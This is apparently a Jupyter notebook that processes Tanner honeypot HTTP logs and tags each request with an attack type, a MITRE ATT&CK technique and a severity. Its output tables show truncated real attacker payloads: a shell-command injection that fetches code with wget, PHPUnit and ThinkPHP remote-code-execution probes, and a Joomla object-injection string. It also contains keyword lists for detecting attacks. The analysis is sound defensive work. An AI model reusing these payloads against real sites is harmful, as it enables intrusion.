# Tanner HTTP Honeypot Dataset Pipeline & Analysis

---

##  Overview
This project presents a complete end-to-end data processing and threat intelligence pipeline for **HTTP web honeypot logs** collected via **Tanner Honeypot** (part of the T-Pot ecosystem).

The goal of this notebook is to ingest raw, unstructured JSON logs, perform exploratory data analysis, extract malicious patterns, label the dataset with threat metadata, and produce a fully enriched dataset ready for Machine Learning or Security Operations (SOC) analysis.

---

## Key Pipeline Steps

### 1. Data Ingestion & Unification
* Downloaded 30 compressed log batches (`.json.gz`) from Tanner honeypot repositories.
* Decompressed and parsed raw JSON streams into structured `pandas` DataFrames (`pandas.json_normalize`).

### 2. Cleaning & Preprocessing
* Handled missing values (`isna()`) and checked for session duplicates.
* Resolved character encoding issues (UTF-8 surrogates in `x-forwarded-for` headers) to ensure seamless CSV export.
* Formatted timestamps and analyzed request session deltas (`delta`) to distinguish automated bot scanners from interactive sessions.

### 3.  Threat Extraction & Attack Classification
Categorized raw HTTP request paths (`path`) into specific cyber threat behaviors using custom rule-based pattern matching:
* **RCE (Remote Code Execution):** PHPUnit RCE, ThinkPHP RCE.
* **Reconnaissance & Vulnerability Scanning:** phpMyAdmin, Solr, HNAP, Joomla, SQLite, Tomcat, Admin Panels.
* **Credential & Sensitive Exposure:** `.env` file exposure attempts.
* **Execution & Persistence:** Web Shell access, arbitrary command execution (`cmd`), malicious payload delivery.

### 4. Security Context Enrichment
Enriched each event log with framework mappings:
* **MITRE ATT&CK Techniques:** Mapped to standardized IDs (e.g., `T1190` for RCE, `T1595` for Scanning, `T1552` for Credential Access, `T1505` for Web Shells).
* **Cyber Kill Chain Stages:** Categorized into *Reconnaissance*, *Initial Access*, *Credential Access*, *Execution*, *Persistence*, and *Lateral Movement*.
* **Severity Levels:** Assigned risk scores (*Critical*, *High*, *Medium*, *Low*).

---

## Output Dataset
The processed and labeled dataset is exported to:
* **`tanner_http_labeled.csv`** – Fully cleaned, classified, and enriched HTTP threat log dataset.

In [ ]:
import os
import urllib.request

os.makedirs("tanner_logs", exist_ok=True)

base_url = "https://raw.githubusercontent.com/0xsha/sweetie-data/master/tanner/log/"

for i in range(1, 31):
    filename = f"tanner_report.json.{i}.gz"
    url = base_url + filename

    urllib.request.urlretrieve(url, f"tanner_logs/{filename}")

    print(f"Downloaded: {filename}")

Downloaded: tanner_report.json.1.gz
Downloaded: tanner_report.json.2.gz
Downloaded: tanner_report.json.3.gz
Downloaded: tanner_report.json.4.gz
Downloaded: tanner_report.json.5.gz
Downloaded: tanner_report.json.6.gz
Downloaded: tanner_report.json.7.gz
Downloaded: tanner_report.json.8.gz
Downloaded: tanner_report.json.9.gz
Downloaded: tanner_report.json.10.gz
Downloaded: tanner_report.json.11.gz
Downloaded: tanner_report.json.12.gz
Downloaded: tanner_report.json.13.gz
Downloaded: tanner_report.json.14.gz
Downloaded: tanner_report.json.15.gz
Downloaded: tanner_report.json.16.gz
Downloaded: tanner_report.json.17.gz
Downloaded: tanner_report.json.18.gz
Downloaded: tanner_report.json.19.gz
Downloaded: tanner_report.json.20.gz
Downloaded: tanner_report.json.21.gz
Downloaded: tanner_report.json.22.gz
Downloaded: tanner_report.json.23.gz
Downloaded: tanner_report.json.24.gz
Downloaded: tanner_report.json.25.gz
Downloaded: tanner_report.json.26.gz
Downloaded: tanner_report.json.27.gz
Downloaded

In [ ]:
import gzip
import json
import os

records = []

folder = "tanner_logs"

for file in os.listdir(folder):
    if file.endswith(".gz"):
        with gzip.open(os.path.join(folder, file), "rt", encoding="utf-8") as f:
            for line in f:
                try:
                    records.append(json.loads(line))
                except:
                    pass

print("Total Records:", len(records))

Total Records: 2544


In [ ]:
import pandas as pd

tanner = pd.json_normalize(records)

print(tanner.shape)

tanner.head()

(2544, 58)


,method,path,uuid,status,timestamp,headers.user-agent,peer.ip,peer.port,cookies.sess_uuid,response_msg.version,...,headers.x-datadog-parent-id,headers.x-datadog-sampling-priority,cookies.cookie,headers.via,headers.proxy-authorization,headers.proxy-connection,headers.upgrade-insecure-requests,headers.origin,headers.bs_real_ip,headers.keep-alive
0,GET,/,5937b960-0ccd-4460-9a6e-31596778f1ea,200,2020-02-14T05:05:26.332743,None,185.140.240.17,38547,None,0.6.0,...,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN
1,GET,/,5937b960-0ccd-4460-9a6e-31596778f1ea,200,2020-02-14T09:02:53.883404,Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebK...,37.6.186.134,46362,None,0.6.0,...,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN
2,POST,/vendor/phpunit/phpunit/src/Util/PHP/eval-stdi...,5937b960-0ccd-4460-9a6e-31596778f1ea,200,2020-02-14T10:46:50.947328,Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...,193.57.40.38,36632,None,0.6.0,...,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN
3,GET,/solr/admin/info/system?wt=json,5937b960-0ccd-4460-9a6e-31596778f1ea,200,2020-02-14T11:26:02.476796,Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...,193.57.40.38,33228,None,0.6.0,...,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN
4,GET,/index.php?s=/Index/%5Cthink%5Capp/invokefunct...,5937b960-0ccd-4460-9a6e-31596778f1ea,200,2020-02-14T11:48:53.656302,Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...,193.57.40.38,47708,None,0.6.0,...,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN,NaN


In [ ]:
tanner.columns.tolist()

['method',
 'path',
 'uuid',
 'status',
 'timestamp',
 'headers.user-agent',
 'peer.ip',
 'peer.port',
 'cookies.sess_uuid',
 'response_msg.version',
 'response_msg.response.message.detection.name',
 'response_msg.response.message.detection.order',
 'response_msg.response.message.detection.type',
 'response_msg.response.message.detection.version',
 'response_msg.response.message.sess_uuid',
 'headers.host',
 'headers.content-length',
 'headers.content-type',
 'headers.accept-encoding',
 'headers.connection',
 'post_data.<?',
 'response_msg.response.message.detection.payload.value',
 'response_msg.response.message.detection.payload.page',
 'headers.accept',
 'headers.soapaction',
 'headers.accept-language',
 'headers.cache-control',
 'headers.pragma',
 'headers.te',
 'headers.authorization',
 'headers.translate',
 'headers.d-pisos',
 'headers.ebut',
 'post_data.admin',
 'headers.accept-charset',
 'post_data.epass',
 'post_data.routestring',
 'post_data.widgetConfig[code]',
 'post_data.h

In [ ]:
tanner.info()

<class 'pandas.core.frame.DataFrame'>
RangeIndex: 2544 entries, 0 to 2543
Data columns (total 58 columns):
 #   Column                                                 Non-Null Count  Dtype 
---  ------                                                 --------------  ----- 
 0   method                                                 2544 non-null   object
 1   path                                                   2544 non-null   object
 2   uuid                                                   2544 non-null   object
 3   status                                                 2544 non-null   int64 
 4   timestamp                                              2544 non-null   object
 5   headers.user-agent                                     2309 non-null   object
 6   peer.ip                                                2544 non-null   object
 7   peer.port                                              2544 non-null   int64 
 8   cookies.sess_uuid                                      168

In [ ]:
missing = (
    tanner
    .isnull()
    .mean()
    .sort_values(ascending=False)
)

missing

,0
headers.bs_real_ip,0.999607
post_data.xx,0.999607
headers.x-datadog-parent-id,0.999607
headers.x-datadog-sampling-priority,0.999607
headers.x-datadog-trace-id,0.999607
headers.keep-alive,0.999607
headers.upgrade-insecure-requests,0.999607
headers.origin,0.999607
headers.soapaction,0.999214
headers.via,0.999214


In [ ]:
print(tanner.duplicated().sum())

0


In [ ]:
tanner["method"].value_counts()

,count
method,
GET,1811
POST,452
HEAD,265
OPTIONS,13
PUT,3


In [ ]:
tanner["status"].value_counts()

,count
status,
200,2544


In [ ]:
print("Unique Sessions:", tanner["uuid"].nunique())

Unique Sessions: 30


In [ ]:
session_sizes = tanner.groupby("uuid").size()
session_sizes.describe()

,0
count,30.000000
mean,84.800000
std,111.192098
min,2.000000
25%,24.000000
50%,36.000000
75%,120.250000
max,522.000000


In [ ]:
tanner["path"].value_counts().head(50)

,count
path,
/,572
/robots.txt,31
/Adminad68aca7/Login.php,15
/HNAP1/,13
/?a=fetch&content=%3Cphp%3Edie(@md5(HelloThinkCMF))%3C/php%3E,13
/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,12
/index.php?s=/Index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=md5&vars%5B1%5D%5B%5D=HelloThinkPHP,12
/?XDEBUG_SESSION_START=phpstorm,11
/index.php,11


In [ ]:
sample = tanner["uuid"].value_counts().idxmax()

tanner[tanner["uuid"] == sample][
    ["timestamp", "method", "path", "peer.ip"]
].sort_values("timestamp")

,timestamp,method,path,peer.ip
1322,2020-01-22T04:56:10.963441,GET,/shell?cd+/tmp;rm+-rf+.j;wget+http:/%5C/91.92....,45.243.162.246
1323,2020-01-22T04:56:11.888267,GET,/shell?cd+/tmp;rm+-rf+.j;wget+http:/%5C/91.92....,45.243.162.246
1324,2020-01-22T05:41:42.580949,GET,/,187.0.174.26
1325,2020-01-22T05:50:24.926195,POST,/vendor/phpunit/phpunit/src/Util/PHP/eval-stdi...,193.57.40.46
1326,2020-01-22T06:21:34.802741,GET,/,169.197.108.42
...,...,...,...,...
1839,2020-01-23T01:17:05.830529,GET,/,159.65.187.159
1840,2020-01-23T01:40:05.490723,GET,/,128.14.133.58
1841,2020-01-23T02:04:52.380796,GET,/,54.36.49.151
1842,2020-01-23T02:24:32.510458,GET,/,190.94.150.226


In [ ]:
tanner["timestamp"] = pd.to_datetime(tanner["timestamp"])

tanner = tanner.sort_values("timestamp").reset_index(drop=True)

In [ ]:
tanner[["timestamp"]].head()

,timestamp
0,2020-01-22 04:56:10.963441
1,2020-01-22 04:56:11.888267
2,2020-01-22 05:41:42.580949
3,2020-01-22 05:50:24.926195
4,2020-01-22 06:21:34.802741


In [ ]:
tanner["peer.ip"].value_counts().head(20)

,count
peer.ip,
52.156.59.22,346
106.52.13.126,232
112.29.173.27,230
138.68.253.13,142
87.231.103.55,139
63.34.7.229,113
185.53.88.102,102
85.170.0.17,99
138.197.143.222,93


In [ ]:
ip = tanner["peer.ip"].value_counts().idxmax()

display(
    tanner[tanner["peer.ip"] == ip][
        ["timestamp","method","path"]
    ]
)

,timestamp,method,path
158,2020-01-22 18:50:25.026623,GET,/.env
159,2020-01-22 18:50:26.942994,POST,//1board/vendor/phpunit/phpunit/src/Util/PHP/e...
160,2020-01-22 18:50:27.845348,POST,//20170811125232/vendor/phpunit/phpunit/src/Ut...
161,2020-01-22 18:50:28.751836,POST,//2018/scholarship/vendor/phpunit/phpunit/src/...
162,2020-01-22 18:50:29.648940,POST,//2018/vendor/phpunit/phpunit/src/Util/PHP/eva...
...,...,...,...
499,2020-01-22 19:00:58.494267,POST,//wszool/vendor/phpunit/phpunit/src/Util/PHP/e...
500,2020-01-22 19:00:59.390276,POST,//www/vendor/phpunit/phpunit/src/Util/PHP/eval...
501,2020-01-22 19:01:01.297997,POST,//xipada/vendor/phpunit/phpunit/src/Util/PHP/e...
502,2020-01-22 19:01:04.214388,POST,//yii/vendor/phpunit/phpunit/src/Util/PHP/eval...


In [ ]:
ip = tanner["peer.ip"].value_counts().idxmax()

sample = (
    tanner[tanner["peer.ip"] == ip]
    .sort_values("timestamp")
    .copy()
)

sample["delta"] = sample["timestamp"].diff()

sample[["timestamp","delta"]].head(20)

,timestamp,delta
158,2020-01-22 18:50:25.026623,NaT
159,2020-01-22 18:50:26.942994,0 days 00:00:01.916371
160,2020-01-22 18:50:27.845348,0 days 00:00:00.902354
161,2020-01-22 18:50:28.751836,0 days 00:00:00.906488
162,2020-01-22 18:50:29.648940,0 days 00:00:00.897104
163,2020-01-22 18:50:30.548233,0 days 00:00:00.899293
164,2020-01-22 18:50:31.447909,0 days 00:00:00.899676
165,2020-01-22 18:50:32.344038,0 days 00:00:00.896129
166,2020-01-22 18:50:33.239465,0 days 00:00:00.895427
167,2020-01-22 18:50:34.135278,0 days 00:00:00.895813


In [ ]:
sample["delta"].describe()

,delta
count,345
mean,0 days 00:00:01.864068188
std,0 days 00:00:08.938340983
min,0 days 00:00:00.894818
25%,0 days 00:00:00.897750
50%,0 days 00:00:00.899540
75%,0 days 00:00:00.902789
max,0 days 00:01:39.033464


In [ ]:
tanner["path"].str.contains("phpunit", case=False, na=False).sum()

np.int64(357)

In [ ]:
tanner["path"].str.contains("thinkphp", case=False, na=False).sum()

np.int64(28)

In [ ]:
tanner["path"].str.contains("solr", case=False, na=False).sum()

np.int64(13)

In [ ]:
tanner["path"].str.contains("robots", case=False, na=False).sum()

np.int64(31)

In [ ]:
tanner["path"].str.contains("manager", case=False, na=False).sum()

np.int64(38)

In [ ]:
tanner["path"].str.contains("phpmyadmin", case=False, na=False).sum()

np.int64(237)

In [ ]:
tanner["peer.ip"].isna().sum()

np.int64(0)

In [ ]:
tanner["path"].isna().sum()

np.int64(0)

In [ ]:
tanner["method"].isna().sum()

np.int64(0)

In [ ]:
tanner.groupby("uuid").size().describe()

,0
count,30.000000
mean,84.800000
std,111.192098
min,2.000000
25%,24.000000
50%,36.000000
75%,120.250000
max,522.000000


In [ ]:
tanner["headers.user-agent"].value_counts().head(30)

,count
headers.user-agent,
"Mozilla/5.0 (Linux; Android 9; HW-01K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36",346
python-requests/2.21.0,254
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",204
Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1,174
Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0,142
Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0,125
"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36",98
Mozilla/5.0,95
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0),80


In [ ]:
tanner["headers.user-agent"].nunique()

95

In [ ]:
tanner["headers.user-agent"].isna().sum()

np.int64(235)

In [ ]:
tanner["response_msg.response.message.detection.name"].value_counts()

,count
response_msg.response.message.detection.name,
index,2061
unknown,464
xss,13
wp-content,3
rfi,3


In [ ]:
tanner["response_msg.response.message.detection.name"].nunique()

5

In [ ]:
post_only = tanner[tanner["method"] == "POST"]

In [ ]:
post_only["path"].value_counts().head(30)

,count
path,
/Adminad68aca7/Login.php,15
/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,12
/xx.php,3
/bbs.php,2
/forums.php,2
/forum/index.php,2
/vvv.php,2
/forums/index.php,2
/wuwu11.php,2


In [ ]:
post_only.filter(regex="post_data").notna().sum().sort_values(ascending=False)

,0
post_data.m,43
post_data.admin,15
post_data.<?,12
post_data.epass,12
post_data.routestring,12
post_data.widgetConfig[code],12
post_data.h,8
post_data.leng,3
post_data.1,2
post_data.axa,2


In [ ]:
top_ip = tanner["peer.ip"].value_counts().idxmax()

top_ip

'52.156.59.22'

In [ ]:
display(
    tanner[tanner["peer.ip"] == top_ip][
        ["timestamp","method","path"]
    ].sort_values("timestamp")
)

,timestamp,method,path
158,2020-01-22 18:50:25.026623,GET,/.env
159,2020-01-22 18:50:26.942994,POST,//1board/vendor/phpunit/phpunit/src/Util/PHP/e...
160,2020-01-22 18:50:27.845348,POST,//20170811125232/vendor/phpunit/phpunit/src/Ut...
161,2020-01-22 18:50:28.751836,POST,//2018/scholarship/vendor/phpunit/phpunit/src/...
162,2020-01-22 18:50:29.648940,POST,//2018/vendor/phpunit/phpunit/src/Util/PHP/eva...
...,...,...,...
499,2020-01-22 19:00:58.494267,POST,//wszool/vendor/phpunit/phpunit/src/Util/PHP/e...
500,2020-01-22 19:00:59.390276,POST,//www/vendor/phpunit/phpunit/src/Util/PHP/eval...
501,2020-01-22 19:01:01.297997,POST,//xipada/vendor/phpunit/phpunit/src/Util/PHP/e...
502,2020-01-22 19:01:04.214388,POST,//yii/vendor/phpunit/phpunit/src/Util/PHP/eval...


In [ ]:
attack_keywords = [
    "phpunit",
    "thinkphp",
    "phpmyadmin",
    "solr",
    "manager",
    "hnap",
    ".env",
    "shell",
    "cmd",
    "wp",
    "joomla",
    "sqlite",
    "tomcat",
    "webdav"
]

for attack in attack_keywords:
    print(
        attack,
        ":",
        tanner["path"].str.contains(
            attack,
            case=False,
            na=False
        ).sum()
    )

phpunit : 357
thinkphp : 28
phpmyadmin : 237
solr : 13
manager : 38
hnap : 16
.env : 4
shell : 19
cmd : 11
wp : 18
joomla : 7
sqlite : 28
tomcat : 0
webdav : 2


In [ ]:
shell_keywords = [
    "shell",
    "cmd",
    "upload",
    "eval",
    "php",
    "backdoor"
]

for word in shell_keywords:
    print(
        word,
        ":",
        tanner["path"].str.contains(
            word,
            case=False,
            na=False
        ).sum()
    )

shell : 19
cmd : 11
upload : 3
eval : 357
php : 1400
backdoor : 0


In [ ]:
attack_summary = {
    "Behavior": [
        "PHPUnit RCE",
        "ThinkPHP RCE",
        "phpMyAdmin Scan",
        "Solr Scan",
        "HNAP Scan",
        ".env Exposure",
        "Web Shell Access",
        "Command Execution",
        "WebDAV",
        "Joomla Scan",
        "SQLite Scan"
    ],

    "Count":[
        357,
        28,
        237,
        13,
        16,
        4,
        19,
        11,
        2,
        7,
        28
    ]
}

attack_df = pd.DataFrame(attack_summary)

attack_df

,Behavior,Count
0,PHPUnit RCE,357
1,ThinkPHP RCE,28
2,phpMyAdmin Scan,237
3,Solr Scan,13
4,HNAP Scan,16
5,.env Exposure,4
6,Web Shell Access,19
7,Command Execution,11
8,WebDAV,2
9,Joomla Scan,7


In [ ]:
attack_df["MITRE"] = [
    "T1190",
    "T1190",
    "Recon",
    "Recon",
    "Recon",
    "T1552",
    "T1505",
    "T1059",
    "T1210",
    "Recon",
    "Recon"
]

attack_df

,Behavior,Count,MITRE
0,PHPUnit RCE,357,T1190
1,ThinkPHP RCE,28,T1190
2,phpMyAdmin Scan,237,Recon
3,Solr Scan,13,Recon
4,HNAP Scan,16,Recon
5,.env Exposure,4,T1552
6,Web Shell Access,19,T1505
7,Command Execution,11,T1059
8,WebDAV,2,T1210
9,Joomla Scan,7,Recon


In [ ]:
attack_df["Stage"] = [
    "Initial Access",
    "Initial Access",
    "Reconnaissance",
    "Reconnaissance",
    "Reconnaissance",
    "Credential Access",
    "Persistence",
    "Execution",
    "Lateral Movement",
    "Reconnaissance",
    "Reconnaissance"
]

In [ ]:
attack_df["Severity"] = [
    "High",
    "High",
    "Medium",
    "Medium",
    "Medium",
    "High",
    "Critical",
    "Critical",
    "Medium",
    "Medium",
    "Medium"
]

In [ ]:
def get_attack_type(path):
    path = str(path).lower()

    if "phpunit" in path:
        return "PHPUnit RCE"

    elif "thinkphp" in path:
        return "ThinkPHP RCE"

    elif "phpmyadmin" in path:
        return "phpMyAdmin Scan"

    elif "solr" in path:
        return "Solr Scan"

    elif "hnap" in path:
        return "HNAP Scan"

    elif ".env" in path:
        return ".env Exposure"

    elif "shell" in path:
        return "Web Shell"

    elif "cmd" in path:
        return "Command Execution"

    elif "webdav" in path:
        return "WebDAV"

    elif "joomla" in path:
        return "Joomla Scan"

    elif "sqlite" in path:
        return "SQLite Scan"

    else:
        return "Other"

tanner["attack_type"] = tanner["path"].apply(get_attack_type)

In [ ]:
tanner["attack_type"].value_counts()

,count
attack_type,
Other,1825
PHPUnit RCE,357
phpMyAdmin Scan,237
SQLite Scan,28
ThinkPHP RCE,28
Web Shell,19
HNAP Scan,16
Solr Scan,13
Command Execution,11


In [ ]:
mitre_map = {
    "PHPUnit RCE": "T1190",
    "ThinkPHP RCE": "T1190",
    "phpMyAdmin Scan": "T1595",
    "Solr Scan": "T1595",
    "HNAP Scan": "T1595",
    ".env Exposure": "T1552",
    "Web Shell": "T1505.003",
    "Command Execution": "T1059",
    "WebDAV": "T1210",
    "Joomla Scan": "T1595",
    "SQLite Scan": "T1595",
    "Other": "Unknown"
}

tanner["mitre_technique"] = tanner["attack_type"].map(mitre_map)

In [ ]:
stage_map = {
    "PHPUnit RCE":"Initial Access",
    "ThinkPHP RCE":"Initial Access",
    "phpMyAdmin Scan":"Reconnaissance",
    "Solr Scan":"Reconnaissance",
    "HNAP Scan":"Reconnaissance",
    ".env Exposure":"Credential Access",
    "Web Shell":"Persistence",
    "Command Execution":"Execution",
    "WebDAV":"Lateral Movement",
    "Joomla Scan":"Reconnaissance",
    "SQLite Scan":"Reconnaissance",
    "Other":"Unknown"
}

tanner["attack_stage"] = tanner["attack_type"].map(stage_map)

In [ ]:
severity_map = {
    "PHPUnit RCE":"High",
    "ThinkPHP RCE":"High",
    "phpMyAdmin Scan":"Medium",
    "Solr Scan":"Medium",
    "HNAP Scan":"Medium",
    ".env Exposure":"High",
    "Web Shell":"Critical",
    "Command Execution":"Critical",
    "WebDAV":"Medium",
    "Joomla Scan":"Medium",
    "SQLite Scan":"Medium",
    "Other":"Low"
}

tanner["severity"] = tanner["attack_type"].map(severity_map)

In [ ]:
tanner[[
    "path",
    "attack_type",
    "mitre_technique",
    "attack_stage",
    "severity"
]].head(20)

,path,attack_type,mitre_technique,attack_stage,severity
0,/shell?cd+/tmp;rm+-rf+.j;wget+http:/%5C/91.92....,Web Shell,T1505.003,Persistence,Critical
1,/shell?cd+/tmp;rm+-rf+.j;wget+http:/%5C/91.92....,Web Shell,T1505.003,Persistence,Critical
2,/,Other,Unknown,Unknown,Low
3,/vendor/phpunit/phpunit/src/Util/PHP/eval-stdi...,PHPUnit RCE,T1190,Initial Access,High
4,/,Other,Unknown,Unknown,Low
5,/,Other,Unknown,Unknown,Low
6,/shell?cd+/tmp;rm+-rf+.j;wget+http:/%5C/91.92....,Web Shell,T1505.003,Persistence,Critical
7,/,Other,Unknown,Unknown,Low
8,/robots.txt,Other,Unknown,Unknown,Low
9,/Adminad68aca7/Login.php,Other,Unknown,Unknown,Low


In [ ]:
tanner[tanner["path"].str.contains(".env", case=False, na=False)]["path"]

,path
158,/.env
186,//adv/advDesenvolvimento-1003/vendor/phpunit/p...
190,//advDesenvolvimento-1003/vendor/phpunit/phpun...
285,//enventa/vendor/phpunit/phpunit/src/Util/PHP/...


In [ ]:
rules = {
"phpunit":"PHPUnit RCE",
"thinkphp":"ThinkPHP RCE",
"phpmyadmin":"phpMyAdmin Scan",
"sqlite":"SQLite Scan",
"joomla":"Joomla Scan",
"manager/html":"Tomcat Scan",
"robots.txt":"Web Recon",
".env":".env Exposure",
"shell":"Web Shell",
"cmd":"Command Execution",
"payload":"Payload Delivery",
"admin":"Admin Panel Scan",
"login":"Admin Panel Scan"
}

In [ ]:
def get_attack_type(path):

    path = str(path).lower()

    # -------- RCE --------
    if "phpunit" in path:
        return "PHPUnit RCE"

    elif "thinkphp" in path:
        return "ThinkPHP RCE"

    # -------- Scanning --------
    elif "phpmyadmin" in path:
        return "phpMyAdmin Scan"

    elif "sqlite" in path:
        return "SQLite Scan"

    elif "solr" in path:
        return "Solr Scan"

    elif "hnap" in path:
        return "HNAP Scan"

    elif "joomla" in path:
        return "Joomla Scan"

    elif "manager/html" in path:
        return "Tomcat Scan"

    # -------- Recon --------
    elif path == "/":
        return "Web Recon"

    elif "robots.txt" in path:
        return "Web Recon"

    elif "admin" in path:
        return "Admin Panel Scan"

    elif "login" in path:
        return "Admin Panel Scan"

    elif "config" in path:
        return "Configuration Scan"

    # -------- Credentials --------
    elif ".env" in path:
        return ".env Exposure"

    # -------- Execution --------
    elif "shell" in path:
        return "Web Shell"

    elif "cmd" in path:
        return "Command Execution"

    elif "payload" in path:
        return "Payload Delivery"

    elif "upload" in path:
        return "File Upload"

    elif "webdav" in path:
        return "WebDAV"

    else:
        return "Other"

In [ ]:
print(tanner.shape)

(2544, 62)


In [ ]:
tanner.info()

<class 'pandas.core.frame.DataFrame'>
RangeIndex: 2544 entries, 0 to 2543
Data columns (total 62 columns):
 #   Column                                                 Non-Null Count  Dtype         
---  ------                                                 --------------  -----         
 0   method                                                 2544 non-null   object        
 1   path                                                   2544 non-null   object        
 2   uuid                                                   2544 non-null   object        
 3   status                                                 2544 non-null   int64         
 4   timestamp                                              2544 non-null   datetime64[ns]
 5   headers.user-agent                                     2309 non-null   object        
 6   peer.ip                                                2544 non-null   object        
 7   peer.port                                              2544 non-null 

In [ ]:
tanner.columns.tolist()

['method',
 'path',
 'uuid',
 'status',
 'timestamp',
 'headers.user-agent',
 'peer.ip',
 'peer.port',
 'cookies.sess_uuid',
 'response_msg.version',
 'response_msg.response.message.detection.name',
 'response_msg.response.message.detection.order',
 'response_msg.response.message.detection.type',
 'response_msg.response.message.detection.version',
 'response_msg.response.message.sess_uuid',
 'headers.host',
 'headers.content-length',
 'headers.content-type',
 'headers.accept-encoding',
 'headers.connection',
 'post_data.<?',
 'response_msg.response.message.detection.payload.value',
 'response_msg.response.message.detection.payload.page',
 'headers.accept',
 'headers.soapaction',
 'headers.accept-language',
 'headers.cache-control',
 'headers.pragma',
 'headers.te',
 'headers.authorization',
 'headers.translate',
 'headers.d-pisos',
 'headers.ebut',
 'post_data.admin',
 'headers.accept-charset',
 'post_data.epass',
 'post_data.routestring',
 'post_data.widgetConfig[code]',
 'post_data.h

In [ ]:
tanner.head()

,method,path,uuid,status,timestamp,headers.user-agent,peer.ip,peer.port,cookies.sess_uuid,response_msg.version,...,headers.proxy-authorization,headers.proxy-connection,headers.upgrade-insecure-requests,headers.origin,headers.bs_real_ip,headers.keep-alive,attack_type,mitre_technique,attack_stage,severity
0,GET,/shell?cd+/tmp;rm+-rf+.j;wget+http:/%5C/91.92....,ade88c93-30a2-4cd0-902c-9b7f99df6579,200,2020-01-22 04:56:10.963441,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/53...,45.243.162.246,33815,None,0.6.0,...,NaN,NaN,NaN,NaN,NaN,NaN,Web Shell,T1505.003,Persistence,Critical
1,GET,/shell?cd+/tmp;rm+-rf+.j;wget+http:/%5C/91.92....,ade88c93-30a2-4cd0-902c-9b7f99df6579,200,2020-01-22 04:56:11.888267,Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/53...,45.243.162.246,33821,None,0.6.0,...,NaN,NaN,NaN,NaN,NaN,NaN,Web Shell,T1505.003,Persistence,Critical
2,GET,/,ade88c93-30a2-4cd0-902c-9b7f99df6579,200,2020-01-22 05:41:42.580949,Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebK...,187.0.174.26,58545,None,0.6.0,...,NaN,NaN,NaN,NaN,NaN,NaN,Other,Unknown,Unknown,Low
3,POST,/vendor/phpunit/phpunit/src/Util/PHP/eval-stdi...,ade88c93-30a2-4cd0-902c-9b7f99df6579,200,2020-01-22 05:50:24.926195,Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...,193.57.40.46,51714,None,0.6.0,...,NaN,NaN,NaN,NaN,NaN,NaN,PHPUnit RCE,T1190,Initial Access,High
4,GET,/,ade88c93-30a2-4cd0-902c-9b7f99df6579,200,2020-01-22 06:21:34.802741,Mozilla/5.0 (Windows NT 10.0; Win64; x64) Appl...,169.197.108.42,37616,None,0.6.0,...,NaN,NaN,NaN,NaN,NaN,NaN,Other,Unknown,Unknown,Low


In [ ]:
get_attack_type("/")

'Web Recon'

In [ ]:
tanner["attack_type"] = tanner["path"].apply(get_attack_type)

In [ ]:
tanner["mitre_technique"] = tanner["attack_type"].map(mitre_map)
tanner["attack_stage"] = tanner["attack_type"].map(stage_map)
tanner["severity"] = tanner["attack_type"].map(severity_map)

In [ ]:
tanner[["path","attack_type"]].head(10)

,path,attack_type
0,/shell?cd+/tmp;rm+-rf+.j;wget+http:/%5C/91.92....,Web Shell
1,/shell?cd+/tmp;rm+-rf+.j;wget+http:/%5C/91.92....,Web Shell
2,/,Web Recon
3,/vendor/phpunit/phpunit/src/Util/PHP/eval-stdi...,PHPUnit RCE
4,/,Web Recon
5,/,Web Recon
6,/shell?cd+/tmp;rm+-rf+.j;wget+http:/%5C/91.92....,Web Shell
7,/,Web Recon
8,/robots.txt,Web Recon
9,/Adminad68aca7/Login.php,Admin Panel Scan


In [ ]:
tanner["attack_type"].value_counts()

,count
attack_type,
Other,923
Web Recon,603
PHPUnit RCE,357
Admin Panel Scan,279
phpMyAdmin Scan,237
SQLite Scan,28
ThinkPHP RCE,28
Web Shell,19
HNAP Scan,16


In [ ]:
print("Duplicates:", tanner.duplicated().sum())

Duplicates: 0


In [ ]:
print("Unique Sessions:", tanner["uuid"].nunique())

Unique Sessions: 30


In [ ]:
print("Unique IPs:", tanner["peer.ip"].nunique())

Unique IPs: 566


In [ ]:
tanner.isna().mean().sort_values(ascending=False)

,0
headers.x-datadog-sampling-priority,0.999607
headers.upgrade-insecure-requests,0.999607
headers.keep-alive,0.999607
headers.bs_real_ip,0.999607
headers.origin,0.999607
...,...
response_msg.response.message.detection.version,0.000000
response_msg.response.message.detection.name,0.000000
uuid,0.000000
status,0.000000


In [ ]:
for col in tanner.select_dtypes(include="object").columns:
    try:
        tanner[col].astype(str).str.encode("utf-8")
    except UnicodeEncodeError:
        print("Problem in:", col)

Problem in: headers.x-forwarded-for


In [ ]:
def has_surrogate(s):
    if not isinstance(s, str):
        return False
    try:
        s.encode("utf-8")
        return False
    except UnicodeEncodeError:
        return True

bad_rows = tanner[
    tanner["headers.x-forwarded-for"].apply(has_surrogate)
]

bad_rows[["headers.x-forwarded-for", "path"]]

,headers.x-forwarded-for,path
852,"}__test|O:21:""JDatabaseDriverMysqli"":3:{s:2:""f...",/joomla/
